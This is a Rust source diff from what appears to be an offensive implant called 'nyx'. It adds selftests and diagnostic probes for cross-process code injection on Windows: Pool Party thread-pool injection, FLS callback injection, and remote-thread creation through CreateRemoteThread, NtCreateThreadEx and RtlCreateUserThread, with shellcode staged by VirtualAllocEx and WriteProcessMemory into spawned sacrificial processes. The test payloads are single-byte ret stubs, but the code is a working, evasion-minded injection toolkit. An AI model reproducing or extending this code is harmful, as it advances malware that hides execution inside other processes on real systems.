@@ -576,12 +576,22 @@ pub unsafe extern "system" fn nyx_selftest_inject() {
 
 // ============================================================================
 // nyx_selftest_inject_pool: exercise the P5 Pool Party path (Task section-backed
-// delivery). Forces POOL_PARTY_ENABLED on, creates a notepad sacrificial, and
-// calls do_inject(method=0) so the section create→map→write→TP_DIRECT path runs
-// against a real process. bit0 = section delivery path ran without panic,
-// bit1 = pool_party_inject returned Ok (full 0-of-3 FND), bit2 = degraded to
-// worker-queue splice (P5-final); current path uses section-backed
-// NtCreateThreadEx which avoids VirtualAllocEx/WriteProcessMemory.
+// delivery). Forces POOL_PARTY_ENABLED on, creates a RUNNING sacrificial —
+// the plain-x64 test sleeper (CRT3_SLEEPER) when deployed (stays alive and
+// holds a thread-pool worker factory), else a running notepad
+// (2026-08-24: a CREATE_SUSPENDED process has no worker factory, so bit1 was
+// unreachable on ANY host; dllhost.exe exits immediately with no COM task —
+// VM-verified; 24H2 notepad.exe is an AppX activation stub, commit e364597) —
+// waits for kernel32 to map (process-init progress proxy, the inject_fls
+// precedent), then calls do_inject(method=0) so the section
+// create→map→write→TP_DIRECT path runs against a real process.
+// bit0 = running sacrificial spawned (section delivery path reached),
+// bit1 = pool_party_inject returned Ok (section delivery + threadless
+//        worker-factory dispatch — NO remote thread is created),
+// bit2 = degraded with WARN prefix to module_stomp (section delivery ran).
+// The raw Err string (pool_party's own error, or the WARN-prefixed fallback
+// failure) is persisted to %TEMP%\nyx_g6_inject_pool.resp for VM triage;
+// %TEMP%\nyx_g6_inject_pool.target records which sacrificial image was used.
 // ⚠️ This opens a remote process + maps a section into it; a bug here may crash
 // the implant or the target (user-mode). Gate is forced ON for this selftest
 // regardless of NYX_POOL_PARTY_ON build-time default.
@@ -592,18 +602,49 @@ pub unsafe extern "system" fn nyx_selftest_inject() {
 pub unsafe extern "system" fn nyx_selftest_inject_pool() {
     crate::selftests::write_marker("nyx_g6_inject_pool.started", "entered\n");
     let mut mask: u32 = 0;
+    // The method-2 degrade path (inject_existing) uses the indirect-syscall
+    // runtime, which rundll32 never bootstraps (DllMain performs NO init) —
+    // bring it up here (the ensure_rt precedent; exits 0xFFFFFFFE if the RT
+    // itself fails to init). g6: without this the fallback reported the
+    // misleading "syscall runtime down".
+    let _rt = ensure_rt();
     // Force the gate ON for this selftest (restore on exit).
     let prev_gate = crate::tp::set_pool_party_enabled(true);
 
-    // Create a notepad sacrificial to inject into (same path as method 2).
-    let proc = match crate::inject::create_sacrificial("notepad.exe") {
-        Ok(p) => p,
-        Err(_) => {
-            crate::tp::set_pool_party_enabled(prev_gate);
-            unsafe { exit(mask) };
+    // RUNNING sacrificial (see the block comment for why a suspended notepad
+    // cannot work). The x64 test sleeper is preferred when deployed: under
+    // Prism it is a peer x64-emulated target, guaranteed alive, holding a
+    // worker factory; otherwise a running notepad.
+    let proc = match crate::inject::create_sacrificial_running(CRT3_SLEEPER) {
+        Ok(p) => {
+            crate::selftests::write_marker("nyx_g6_inject_pool.target", CRT3_SLEEPER);
+            p
         }
+        Err(_) => match crate::inject::create_sacrificial_running("notepad.exe") {
+            Ok(p) => {
+                crate::selftests::write_marker("nyx_g6_inject_pool.target", "notepad.exe");
+                p
+            }
+            Err(_) => {
+                crate::tp::set_pool_party_enabled(prev_gate);
+                unsafe { exit(mask) };
+            }
+        },
     };
-    mask |= 1 << 0; // create_sacrificial Ok (reached the inject path)
+    mask |= 1 << 0; // create_sacrificial_running Ok (reached the inject path)
+
+    // Wait for process init to progress (kernel32 mapped) before injecting —
+    // same rationale as the inject_fls selftest.
+    let _ = unsafe { crate::inject::wait_remote_kernel32(proc.handle) };
+    // The sleeper creates its thread pool (and hence the worker-factory
+    // object pool party scans for) at the TOP of main — but kernel32-mapped
+    // only means the loader ran; main runs later. Without this settle delay
+    // the handle-table scan legitimately finds no worker factory yet (VM
+    // evidence 2026-08-24: "hijack: target has no worker-factory handle").
+    if let Some(slp) = nyx_implant_core::resolve::export_addr(b"kernel32.dll", b"Sleep") {
+        let sleep: unsafe extern "system" fn(u32) = unsafe { core::mem::transmute(slp) };
+        unsafe { sleep(2_000) };
+    }
 
     // Minimal shellcode: `ret` (0xC3). We're verifying the section delivery
     // mechanism, not payload execution — a single-byte ret is the safest probe
@@ -611,8 +652,9 @@ pub unsafe extern "system" fn nyx_selftest_inject_pool() {
     let shellcode: [u8; 1] = [0xC3];
 
     // do_inject(method=0, pid, spawn_to, shellcode) routes through the
-    // pool_party branch (gate ON) → tp::pool_party_inject.
-    let resp = crate::inject::do_inject(0, proc.pid, "notepad.exe", &shellcode);
+    // pool_party branch (gate ON) → tp::pool_party_inject. spawn_to is unused
+    // with a nonzero pid — pass the sleeper path for log readability.
+    let resp = crate::inject::do_inject(0, proc.pid, CRT3_SLEEPER, &shellcode);
 
     // Decode the response. Response::Output carries a status line we can sniff.
     match resp {
@@ -626,8 +668,133 @@ pub unsafe extern "system" fn nyx_selftest_inject_pool() {
                 mask |= 1 << 2; // degraded to module_stomp (section delivery ran)
             }
         }
-        nyx_protocol::Response::Err(_) => {
+        nyx_protocol::Response::Err(e) => {
             // do_inject returned an error — section delivery itself failed.
+            // g6 diagnosis: persist the exact Err string (pool_party's own
+            // error or the degraded method-2 fallback's) for VM triage.
+            crate::selftests::write_marker("nyx_g6_inject_pool.resp", e.as_str());
+        }
+        _ => {}
+    }
+
+    // Cleanup: terminate the running sacrificial (whether or not inject landed).
+    if let Some(tp_addr) =
+        nyx_implant_core::resolve::export_addr(b"kernel32.dll", b"TerminateProcess")
+    {
+        type TerminateProcess = unsafe extern "system" fn(*mut core::ffi::c_void, u32) -> i32;
+        let terminate: TerminateProcess = unsafe { core::mem::transmute(tp_addr) };
+        let _ = unsafe { terminate(proc.handle, 1) };
+    }
+    // The Drop guard on `proc` closes BOTH handles (its own terminate is a
+    // no-op on the already-dead process). Explicitly drop before exit() — the
+    // selftest's exit is noreturn, so scope-end Drop would never run.
+    core::mem::drop(proc);
+
+    crate::tp::set_pool_party_enabled(prev_gate);
+    unsafe { exit(mask) };
+}
+
+// ============================================================================
+// nyx_selftest_inject_fls: exercise the WP-A FLS callback inject (method 3).
+// Forces FLS_INJECT_ENABLED on, spawns a RUNNING notepad sacrificial (a
+// suspended one has no kernel32 mapped — a remote FlsAlloc thread would start
+// at an unmapped address), waits for kernel32, then do_inject(3, pid) with a
+// 1-byte `ret` (0xC3) probe. The probe is invoked by the target's thread-exit
+// FLS rundown as callback(rcx = self) and returns immediately — no side
+// effects. Bits: 0 = sacrificial spawned, 1 = kernel32 mapped in the target,
+// 2 = do_inject reported the FLS ok line (register + trigger path ran),
+// 3 = SKIP FLAG (not a pass, the bof_isolated bit3 precedent): fls.rs
+//     refused up front because the environment is x64-on-ARM64 emulation.
+// The raw do_inject response (Ok line or Err) is persisted to
+// %TEMP%\nyx_g6_inject_fls.resp so the VM run shows WHICH step failed.
+// ⚠️ Real cross-process injection against a live process; gate is forced ON
+// for this selftest (restored on exit).
+// ⚠️ KNOWN ENV LIMIT (2026-08-22): on Win11 ARM64 + Prism x64 emulation
+// cross-arch remote-thread creation is broken (kernel32!CreateRemoteThread
+// GLE=6; direct NtCreateThreadEx threads start native ARM64 and crash the
+// target — see the fls.rs module docs; evidence from nyx_selftest_crt_probe2),
+// so fls.rs refuses up front. 2026-08-24: that refusal now sets bit3 — the
+// expected Prism exit is 0b1011 = 0xB (bits 0/1/3), visibly different from
+// both the full-pass 0x7 and a real failure with bit3 clear. bit2 is only
+// expected on native x64 (or an x64-emulated target, see crt_probe3).
+// ============================================================================
+
+#[cfg(feature = "selftest")]
+#[no_mangle]
+pub unsafe extern "system" fn nyx_selftest_inject_fls() {
+    crate::selftests::write_marker("nyx_g6_inject_fls.started", "entered\n");
+    let mut mask: u32 = 0;
+    // Force the gate ON for this selftest (restore on exit).
+    let prev_gate = crate::fls::set_fls_inject_enabled(true);
+
+    // RUNNING sacrificial (see the block comment for why suspended won't do).
+    // Under x64-on-ARM64 emulation, prefer the plain-x64 test sleeper
+    // (CRT3_SLEEPER): Prism only breaks CROSS-ARCH remote threads, so an
+    // x64-emulated peer target stays injectable (crt_probe3). Fall back to
+    // notepad when the sleeper is not deployed — fls.rs then refuses
+    // (bit3 skip).
+    let under_prism = nyx_implant_core::syscalls::is_x64_emulated_on_arm64();
+    let proc = if under_prism {
+        match crate::inject::create_sacrificial_running(CRT3_SLEEPER) {
+            Ok(p) => {
+                crate::selftests::write_marker("nyx_g6_inject_fls.target", CRT3_SLEEPER);
+                p
+            }
+            Err(_) => match crate::inject::create_sacrificial_running("notepad.exe") {
+                Ok(p) => {
+                    crate::selftests::write_marker("nyx_g6_inject_fls.target", "notepad.exe");
+                    p
+                }
+                Err(_) => {
+                    crate::fls::set_fls_inject_enabled(prev_gate);
+                    unsafe { exit(mask) };
+                }
+            },
+        }
+    } else {
+        match crate::inject::create_sacrificial_running("notepad.exe") {
+            Ok(p) => p,
+            Err(_) => {
+                crate::fls::set_fls_inject_enabled(prev_gate);
+                unsafe { exit(mask) };
+            }
+        }
+    };
+    mask |= 1 << 0; // create_sacrificial_running Ok
+
+    if unsafe { crate::inject::wait_remote_kernel32(proc.handle) }.is_ok() {
+        mask |= 1 << 1; // kernel32 mapped → remote kernel32 threads are safe
+    }
+
+    // Minimal shellcode: `ret` (0xC3). We verify the register + trigger
+    // mechanism, not payload execution — the probe returns instantly if the
+    // FLS rundown fires it.
+    let shellcode: [u8; 1] = [0xC3];
+
+    // do_inject(method=3, pid, spawn_to, shellcode) routes through the
+    // existing-pid FLS branch → fls::fls_callback_inject.
+    let resp = crate::inject::do_inject(3, proc.pid, "notepad.exe", &shellcode);
+    // g6 diagnosis (2026-08-21): the 3-bit exit mask cannot say WHICH step of
+    // fls_callback_inject failed — persist the raw do_inject response (the Ok
+    // line or the &'static str Err from fls.rs) so the VM run leaves evidence.
+    match &resp {
+        nyx_protocol::Response::Output(bytes) => {
+            let text = core::str::from_utf8(bytes).unwrap_or("");
+            crate::selftests::write_marker("nyx_g6_inject_fls.resp", text);
+            if text.contains("fls callback inject ok") {
+                mask |= 1 << 2; // remote FlsAlloc + trigger stub ran clean
+            }
+        }
+        nyx_protocol::Response::Err(e) => {
+            crate::selftests::write_marker("nyx_g6_inject_fls.resp", e.as_str());
+            // bit3 SKIP FLAG: the fls.rs up-front refusal under x64-on-ARM64
+            // emulation is an expected environment limit, not a failure —
+            // make the skip visible in the exit code (0b1011 = 0xB when the
+            // spawn/wait bits also set), never a silent pass or a disguised
+            // failure (2026-08-24).
+            if e.contains("x64-on-ARM64 emulation") {
+                mask |= 1 << 3;
+            }
         }
         _ => {}
     }
@@ -645,11 +812,611 @@ pub unsafe extern "system" fn nyx_selftest_inject_pool() {
     // selftest's exit is noreturn, so scope-end Drop would never run.
     core::mem::drop(proc);
 
-    crate::tp::set_pool_party_enabled(prev_gate);
+    crate::fls::set_fls_inject_enabled(prev_gate);
     unsafe { exit(mask) };
 }
 
-/// Bits: 0=hostname-nonempty-nonhost, 1=username-nonempty-nonuser, 2=pid-nonzero.
+// ============================================================================
+// nyx_selftest_crt_probe2 — g6 diagnosis (2026-08-22), TEMPORARY probe.
+// Isolation fix over nyx_selftest_crt_probe: probe1 ran all controls against
+// ONE target, but a control whose thread AV'd (exit 0xC0000005) terminated
+// the sacrificial via the unhandled-exception path and every later control
+// on the same process then failed with STATUS_INVALID_THREAD (0xC000000A) —
+// a cascade artifact, not evidence. Each control below spawns its OWN running
+// notepad, waits for kernel32, opens it (0x002A), runs exactly one thread-
+// creation attempt, and terminates it (drop guard).
+// Controls (marker = nyx_g6_crt2.<name>):
+//   crt_priv   kernel32!CreateRemoteThread, start = private RX (xor eax,eax;ret)
+//   crt_exp    kernel32!CreateRemoteThread, start = kernel32!Sleep(0)
+//   ntcrt_priv ntdll!NtCreateThreadEx,      start = private RX (mov eax,0x1234;ret)
+//   ntcrt_exp  ntdll!NtCreateThreadEx,      start = kernel32!Sleep(0)
+//   rcut_exp   ntdll!RtlCreateUserThread,   start = kernel32!Sleep(0)
+// Marker text: "spawn/open/stage failed" | "create-fail gle=<dec>" |
+//              "ntstatus=0x<hex>" | "wait=<dec> exit=0x<hex>".
+// Exit-mask bit i set = control i's thread object was created (says nothing
+// about whether the thread body ran clean — read the markers for that).
+// ============================================================================
+
+/// Resolved Win32/NT primitives shared by the crt_probe2 controls.
+#[cfg(feature = "selftest")]
+struct Crt2Fns {
+    op: unsafe extern "system" fn(u32, i32, u32) -> *mut core::ffi::c_void,
+    vax: unsafe extern "system" fn(
+        *mut core::ffi::c_void,
+        *const core::ffi::c_void,
+        usize,
+        u32,
+        u32,
+    ) -> *mut core::ffi::c_void,
+    vpx: unsafe extern "system" fn(
+        *mut core::ffi::c_void,
+        *const core::ffi::c_void,
+        usize,
+        u32,
+        *mut u32,
+    ) -> i32,
+    vfx: unsafe extern "system" fn(*mut core::ffi::c_void, *mut core::ffi::c_void, usize, u32) -> i32,
+    wpm: unsafe extern "system" fn(
+        *mut core::ffi::c_void,
+        *mut core::ffi::c_void,
+        *const u8,
+        usize,
+        *mut usize,
+    ) -> i32,
+    crt: unsafe extern "system" fn(
+        *mut core::ffi::c_void,
+        *mut core::ffi::c_void,
+        usize,
+        Option<unsafe extern "system" fn(*mut core::ffi::c_void) -> u32>,
+        *mut core::ffi::c_void,
+        u32,
+        *mut core::ffi::c_void,
+    ) -> *mut core::ffi::c_void,
+    wait: unsafe extern "system" fn(*mut core::ffi::c_void, u32) -> u32,
+    gec: unsafe extern "system" fn(*mut core::ffi::c_void, *mut u32) -> i32,
+    gle: unsafe extern "system" fn() -> u32,
+    close: unsafe extern "system" fn(*mut core::ffi::c_void) -> i32,
+    ntcrt: Option<
+        unsafe extern "system" fn(
+            *mut *mut core::ffi::c_void,
+            u32,
+            *mut core::ffi::c_void,
+            *mut core::ffi::c_void,
+            *mut core::ffi::c_void,
+            *mut core::ffi::c_void,
+            u32,
+            usize,
+            usize,
+            usize,
+            *mut core::ffi::c_void,
+        ) -> i32,
+    >,
+    rcut: Option<
+        unsafe extern "system" fn(
+            *mut core::ffi::c_void,
+            *mut core::ffi::c_void,
+            i32,
+            u32,
+            usize,
+            usize,
+            *mut core::ffi::c_void,
+            *mut core::ffi::c_void,
+            *mut *mut core::ffi::c_void,
+            *mut core::ffi::c_void,
+        ) -> i32,
+    >,
+    sleep: usize,
+}
+
+/// Spawn a fresh running notepad + wait for kernel32 + open it. The returned
+/// guard terminates the process on drop (never mark_resumed).
+#[cfg(feature = "selftest")]
+unsafe fn crt2_open(
+    fns: &Crt2Fns,
+) -> Option<(crate::inject::SacrificialProcess, *mut core::ffi::c_void)> {
+    unsafe { crt2_open_image(fns, "notepad.exe", 0x002A) }
+}
+
+/// [`crt2_open`] with a caller-chosen image and open mask (crt_probe3 targets
+/// a peer x64-emulated process instead of the native-ARM64 notepad, and its
+/// FLS control needs PROCESS_QUERY_LIMITED_INFORMATION (0x1000) so
+/// IsWow64Process2 can classify the target's architecture).
+#[cfg(feature = "selftest")]
+unsafe fn crt2_open_image(
+    fns: &Crt2Fns,
+    image: &str,
+    access: u32,
+) -> Option<(crate::inject::SacrificialProcess, *mut core::ffi::c_void)> {
+    let proc = unsafe { crate::inject::create_sacrificial_running(image) }.ok()?;
+    if unsafe { crate::inject::wait_remote_kernel32(proc.handle) }.is_err() {
+        return None; // drop terminates the spawn
+    }
+    let h = unsafe { (fns.op)(access, 0, proc.pid) };
+    if h.is_null() || h as usize == usize::MAX {
+        return None;
+    }
+    Some((proc, h))
+}
+
+/// Stage `code` into a fresh private RX region in the target. Caller frees
+/// with `crt2_free`. Returns null on any failure.
+#[cfg(feature = "selftest")]
+unsafe fn crt2_stage(
+    fns: &Crt2Fns,
+    h: *mut core::ffi::c_void,
+    code: &[u8],
+) -> *mut core::ffi::c_void {
+    let region = unsafe { (fns.vax)(h, core::ptr::null(), 0x1000, 0x3000, 0x04) };
+    if region.is_null() {
+        return core::ptr::null_mut();
+    }
+    let mut written: usize = 0;
+    let mut old: u32 = 0;
+    let ok = unsafe { (fns.wpm)(h, region, code.as_ptr(), code.len(), &mut written) } != 0
+        && unsafe { (fns.vpx)(h, region as *const _, 0x1000, 0x20, &mut old) } != 0;
+    if !ok {
+        unsafe { crt2_free(fns, h, region) };
+        return core::ptr::null_mut();
+    }
+    region
+}
+
+#[cfg(feature = "selftest")]
+unsafe fn crt2_free(fns: &Crt2Fns, h: *mut core::ffi::c_void, region: *mut core::ffi::c_void) {
+    let _ = unsafe { (fns.vfx)(h, region, 0, 0x8000) }; // MEM_RELEASE
+}
+
+/// Wait + exit-code + close for a created thread; the shared tail of every
+/// control's marker text.
+#[cfg(feature = "selftest")]
+unsafe fn crt2_observe(fns: &Crt2Fns, th: *mut core::ffi::c_void) -> String {
+    let w = unsafe { (fns.wait)(th, 5_000) };
+    let mut ec: u32 = u32::MAX;
+    let _ = unsafe { (fns.gec)(th, &mut ec) };
+    let _ = unsafe { (fns.close)(th) };
+    let mut s = String::from("wait=");
+    s.push_str(&dec_u32(w));
+    s.push_str(" exit=0x");
+    s.push_str(&hex_u32(ec));
+    s
+}
+
+#[cfg(feature = "selftest")]
+unsafe fn crt2_run_crt(
+    fns: &Crt2Fns,
+    h: *mut core::ffi::c_void,
+    start: *mut core::ffi::c_void,
+) -> (String, bool) {
+    let start_proc: unsafe extern "system" fn(*mut core::ffi::c_void) -> u32 =
+        unsafe { core::mem::transmute(start) };
+    let th = unsafe {
+        (fns.crt)(
+            h,
+            core::ptr::null_mut(),
+            0,
+            Some(start_proc),
+            core::ptr::null_mut(),
+            0,
+            core::ptr::null_mut(),
+        )
+    };
+    if th.is_null() {
+        let mut s = String::from("create-fail gle=");
+        s.push_str(&dec_u32(unsafe { (fns.gle)() }));
+        return (s, false);
+    }
+    (unsafe { crt2_observe(fns, th) }, true)
+}
+
+#[cfg(feature = "selftest")]
+unsafe fn crt2_run_ntcrt(
+    fns: &Crt2Fns,
+    h: *mut core::ffi::c_void,
+    start: *mut core::ffi::c_void,
+) -> (String, bool) {
+    let Some(ntcrt) = fns.ntcrt else {
+        return (String::from("NtCreateThreadEx unresolved"), false);
+    };
+    let mut th: *mut core::ffi::c_void = core::ptr::null_mut();
+    let status = unsafe {
+        ntcrt(
+            &mut th,
+            0x001F_FFFF, // THREAD_ALL_ACCESS
+            core::ptr::null_mut(),
+            h,
+            start,
+            core::ptr::null_mut(),
+            0,
+            0,
+            0,
+            0,
+            core::ptr::null_mut(),
+        )
+    };
+    if status < 0 || th.is_null() {
+        let mut s = String::from("ntstatus=0x");
+        s.push_str(&hex_u32(status as u32));
+        return (s, false);
+    }
+    (unsafe { crt2_observe(fns, th) }, true)
+}
+
+#[cfg(feature = "selftest")]
+unsafe fn crt2_run_rcut(
+    fns: &Crt2Fns,
+    h: *mut core::ffi::c_void,
+    start: *mut core::ffi::c_void,
+) -> (String, bool) {
+    let Some(rcut) = fns.rcut else {
+        return (String::from("RtlCreateUserThread unresolved"), false);
+    };
+    let mut th: *mut core::ffi::c_void = core::ptr::null_mut();
+    let status = unsafe {
+        rcut(
+            h,
+            core::ptr::null_mut(),
+            0,
+            0,
+            0,
+            0,
+            start,
+            core::ptr::null_mut(),
+            &mut th,
+            core::ptr::null_mut(),
+        )
+    };
+    if status < 0 || th.is_null() {
+        let mut s = String::from("ntstatus=0x");
+        s.push_str(&hex_u32(status as u32));
+        return (s, false);
+    }
+    (unsafe { crt2_observe(fns, th) }, true)
+}
+
+/// NtCreateThreadEx with a one-entry PS_ATTRIBUTE_LIST carrying
+/// MachineType = IMAGE_FILE_MACHINE_AMD64 (0x8664). Layout (x64):
+/// TotalLength (usize) + one PS_ATTRIBUTE { Attribute, Size, Value,
+/// ReturnLength } = 8 + 32 bytes.
+#[cfg(feature = "selftest")]
+unsafe fn crt2_run_ntcrt_mach(
+    fns: &Crt2Fns,
+    h: *mut core::ffi::c_void,
+    start: *mut core::ffi::c_void,
+) -> (String, bool) {
+    let Some(ntcrt) = fns.ntcrt else {
+        return (String::from("NtCreateThreadEx unresolved"), false);
+    };
+    const PS_ATTRIBUTE_INPUT: usize = 0x2_0000;
+    const PS_ATTRIBUTE_MACHINE_TYPE: usize = (28 << 16) | PS_ATTRIBUTE_INPUT;
+    const IMAGE_FILE_MACHINE_AMD64: usize = 0x8664;
+    // PS_ATTRIBUTE_LIST { TotalLength, Attributes[1] } — 5 usize fields.
+    let mut attr_list: [usize; 5] = [
+        5 * core::mem::size_of::<usize>(), // TotalLength
+        PS_ATTRIBUTE_MACHINE_TYPE,
+        2, // Size = sizeof(USHORT)
+        IMAGE_FILE_MACHINE_AMD64,
+        0, // ReturnLength = NULL
+    ];
+    let mut th: *mut core::ffi::c_void = core::ptr::null_mut();
+    let status = unsafe {
+        ntcrt(
+            &mut th,
+            0x001F_FFFF,
+            core::ptr::null_mut(),
+            h,
+            start,
+            core::ptr::null_mut(),
+            0,
+            0,
+            0,
+            0,
+            attr_list.as_mut_ptr() as *mut core::ffi::c_void,
+        )
+    };
+    if status < 0 || th.is_null() {
+        let mut s = String::from("ntstatus=0x");
+        s.push_str(&hex_u32(status as u32));
+        return (s, false);
+    }
+    (unsafe { crt2_observe(fns, th) }, true)
+}
+
+#[cfg(feature = "selftest")]
+#[no_mangle]
+pub unsafe extern "system" fn nyx_selftest_crt_probe2() {
+    let k32: &[u8] = b"kernel32.dll";
+    let ntdll: &[u8] = b"ntdll.dll";
+    let ea = |m: &[u8], n: &[u8]| unsafe { nyx_implant_core::resolve::export_addr(m, n) };
+    let (Some(op), Some(vax), Some(vpx), Some(vfx), Some(wpm), Some(crt), Some(wait), Some(gec), Some(gle), Some(close), Some(sleep)) = (
+        ea(k32, b"OpenProcess"),
+        ea(k32, b"VirtualAllocEx"),
+        ea(k32, b"VirtualProtectEx"),
+        ea(k32, b"VirtualFreeEx"),
+        ea(k32, b"WriteProcessMemory"),
+        ea(k32, b"CreateRemoteThread"),
+        ea(k32, b"WaitForSingleObject"),
+        ea(k32, b"GetExitCodeThread"),
+        ea(k32, b"GetLastError"),
+        ea(k32, b"CloseHandle"),
+        ea(k32, b"Sleep"),
+    ) else {
+        unsafe { exit(0) };
+    };
+    let fns = Crt2Fns {
+        op: unsafe { core::mem::transmute(op) },
+        vax: unsafe { core::mem::transmute(vax) },
+        vpx: unsafe { core::mem::transmute(vpx) },
+        vfx: unsafe { core::mem::transmute(vfx) },
+        wpm: unsafe { core::mem::transmute(wpm) },
+        crt: unsafe { core::mem::transmute(crt) },
+        wait: unsafe { core::mem::transmute(wait) },
+        gec: unsafe { core::mem::transmute(gec) },
+        gle: unsafe { core::mem::transmute(gle) },
+        close: unsafe { core::mem::transmute(close) },
+        ntcrt: ea(ntdll, b"NtCreateThreadEx").map(|a| unsafe { core::mem::transmute(a) }),
+        rcut: ea(ntdll, b"RtlCreateUserThread").map(|a| unsafe { core::mem::transmute(a) }),
+        sleep,
+    };
+
+    let mut mask: u32 = 0;
+    // xor eax,eax ; ret — exit code 0
+    const RET0: [u8; 3] = [0x31, 0xC0, 0xC3];
+    // mov eax, 0x1234 ; ret — exit code 0x1234 (proves the body ran)
+    const RET1234: [u8; 6] = [0xB8, 0x34, 0x12, 0x00, 0x00, 0xC3];
+
+    // crt_priv: kernel32 CRT, private RX start.
+    let (text, created) = match unsafe { crt2_open(&fns) } {
+        None => (String::from("spawn/open failed"), false),
+        Some((proc, h)) => {
+            let region = unsafe { crt2_stage(&fns, h, &RET0) };
+            let r = if region.is_null() {
+                (String::from("stage failed"), false)
+            } else {
+                let r = unsafe { crt2_run_crt(&fns, h, region) };
+                unsafe { crt2_free(&fns, h, region) };
+                r
+            };
+            let _ = unsafe { (fns.close)(h) };
+            core::mem::drop(proc);
+            r
+        }
+    };
+    crate::selftests::write_marker("nyx_g6_crt2.crt_priv", &text);
+    if created {
+        mask |= 1 << 0;
+    }
+
+    // crt_exp: kernel32 CRT, kernel32!Sleep start.
+    let (text, created) = match unsafe { crt2_open(&fns) } {
+        None => (String::from("spawn/open failed"), false),
+        Some((proc, h)) => {
+            let r = unsafe { crt2_run_crt(&fns, h, fns.sleep as *mut _) };
+            let _ = unsafe { (fns.close)(h) };
+            core::mem::drop(proc);
+            r
+        }
+    };
+    crate::selftests::write_marker("nyx_g6_crt2.crt_exp", &text);
+    if created {
+        mask |= 1 << 1;
+    }
+
+    // ntcrt_priv: NtCreateThreadEx, private RX start.
+    let (text, created) = match unsafe { crt2_open(&fns) } {
+        None => (String::from("spawn/open failed"), false),
+        Some((proc, h)) => {
+            let region = unsafe { crt2_stage(&fns, h, &RET1234) };
+            let r = if region.is_null() {
+                (String::from("stage failed"), false)
+            } else {
+                let r = unsafe { crt2_run_ntcrt(&fns, h, region) };
+                unsafe { crt2_free(&fns, h, region) };
+                r
+            };
+            let _ = unsafe { (fns.close)(h) };
+            core::mem::drop(proc);
+            r
+        }
+    };
+    crate::selftests::write_marker("nyx_g6_crt2.ntcrt_priv", &text);
+    if created {
+        mask |= 1 << 2;
+    }
+
+    // ntcrt_exp: NtCreateThreadEx, kernel32!Sleep start.
+    let (text, created) = match unsafe { crt2_open(&fns) } {
+        None => (String::from("spawn/open failed"), false),
+        Some((proc, h)) => {
+            let r = unsafe { crt2_run_ntcrt(&fns, h, fns.sleep as *mut _) };
+            let _ = unsafe { (fns.close)(h) };
+            core::mem::drop(proc);
+            r
+        }
+    };
+    crate::selftests::write_marker("nyx_g6_crt2.ntcrt_exp", &text);
+    if created {
+        mask |= 1 << 3;
+    }
+
+    // rcut_exp: RtlCreateUserThread, kernel32!Sleep start.
+    let (text, created) = match unsafe { crt2_open(&fns) } {
+        None => (String::from("spawn/open failed"), false),
+        Some((proc, h)) => {
+            let r = unsafe { crt2_run_rcut(&fns, h, fns.sleep as *mut _) };
+            let _ = unsafe { (fns.close)(h) };
+            core::mem::drop(proc);
+            r
+        }
+    };
+    crate::selftests::write_marker("nyx_g6_crt2.rcut_exp", &text);
+    if created {
+        mask |= 1 << 4;
+    }
+
+    // ntcrt_mach: NtCreateThreadEx + PS_ATTRIBUTE_LIST[MachineType=0x8664]
+    // (PsAttributeMachineType=28, INPUT flag → 0x001E0000; ProcessHacker
+    // ntpsapi.h), start = private RX `mov eax,0x1234; ret`. On ARM64 the
+    // kernel may need the thread's machine type spelled out for a cross-
+    // process thread into an emulated process; without it the thread starts
+    // NATIVE ARM64 at an x64 address (probe1: exit 0xC000001D/0xC0000005).
+    let (text, created) = match unsafe { crt2_open(&fns) } {
+        None => (String::from("spawn/open failed"), false),
+        Some((proc, h)) => {
+            let region = unsafe { crt2_stage(&fns, h, &RET1234) };
+            let r = if region.is_null() {
+                (String::from("stage failed"), false)
+            } else {
+                let r = unsafe { crt2_run_ntcrt_mach(&fns, h, region) };
+                unsafe { crt2_free(&fns, h, region) };
+                r
+            };
+            let _ = unsafe { (fns.close)(h) };
+            core::mem::drop(proc);
+            r
+        }
+    };
+    crate::selftests::write_marker("nyx_g6_crt2.ntcrt_mach", &text);
+    if created {
+        mask |= 1 << 5;
+    }
+
+    unsafe { exit(mask) };
+}
+
+// ============================================================================
+// nyx_selftest_crt_probe3 — x64→x64 sub-case (2026-08-24), TEMPORARY probe.
+// probe2 proved x64-emulated → native-ARM64 remote-thread creation is broken
+// under Prism (kernel32!CreateRemoteThread GLE=6; NtCreateThreadEx starts the
+// thread native ARM64 and crashes the target). This probe asks the remaining
+// question: does Prism translate remote-thread creation when BOTH ends are
+// x64-emulated? The target is the plain-x64 test sleeper
+// C:\nyx_test\nyx_x64_sleeper.exe (mingw-built, Sleep loop; deployed with the
+// test DLL). If crt_exp/crt_priv run clean here, the fls.rs Prism refusal is
+// scoped to cross-arch targets only and FLS injection remains usable against
+// x64 processes on Win11 ARM64.
+// Controls (marker = nyx_g6_crt3.<name>):
+//   crt_exp   kernel32!CreateRemoteThread, start = kernel32!Sleep(0)
+//   crt_priv  kernel32!CreateRemoteThread, start = private RX (mov eax,0x1234;ret)
+//   fls       full fls::fls_callback_inject(0xC3 probe) against the sleeper
+//             (exercises register + trigger, not just thread creation)
+// Exit mask: bit0 = crt_exp thread created, bit1 = crt_priv body ran (the
+// marker carries wait/exit), bit2 = fls_callback_inject Ok. bit3 = sleeper
+// spawn/open failed (environment/deploy issue, not a verdict).
+// ============================================================================
+
+/// Path of the plain-x64 test sleeper on the VM (deployed with the test DLL).
+#[cfg(feature = "selftest")]
+const CRT3_SLEEPER: &str = "C:\\nyx_test\\nyx_x64_sleeper.exe";
+
+#[cfg(feature = "selftest")]
+#[no_mangle]
+pub unsafe extern "system" fn nyx_selftest_crt_probe3() {
+    let k32: &[u8] = b"kernel32.dll";
+    let ntdll: &[u8] = b"ntdll.dll";
+    let ea = |m: &[u8], n: &[u8]| unsafe { nyx_implant_core::resolve::export_addr(m, n) };
+    let (Some(op), Some(vax), Some(vpx), Some(vfx), Some(wpm), Some(crt), Some(wait), Some(gec), Some(gle), Some(close), Some(sleep)) = (
+        ea(k32, b"OpenProcess"),
+        ea(k32, b"VirtualAllocEx"),
+        ea(k32, b"VirtualProtectEx"),
+        ea(k32, b"VirtualFreeEx"),
+        ea(k32, b"WriteProcessMemory"),
+        ea(k32, b"CreateRemoteThread"),
+        ea(k32, b"WaitForSingleObject"),
+        ea(k32, b"GetExitCodeThread"),
+        ea(k32, b"GetLastError"),
+        ea(k32, b"CloseHandle"),
+        ea(k32, b"Sleep"),
+    ) else {
+        unsafe { exit(0) };
+    };
+    let fns = Crt2Fns {
+        op: unsafe { core::mem::transmute(op) },
+        vax: unsafe { core::mem::transmute(vax) },
+        vpx: unsafe { core::mem::transmute(vpx) },
+        vfx: unsafe { core::mem::transmute(vfx) },
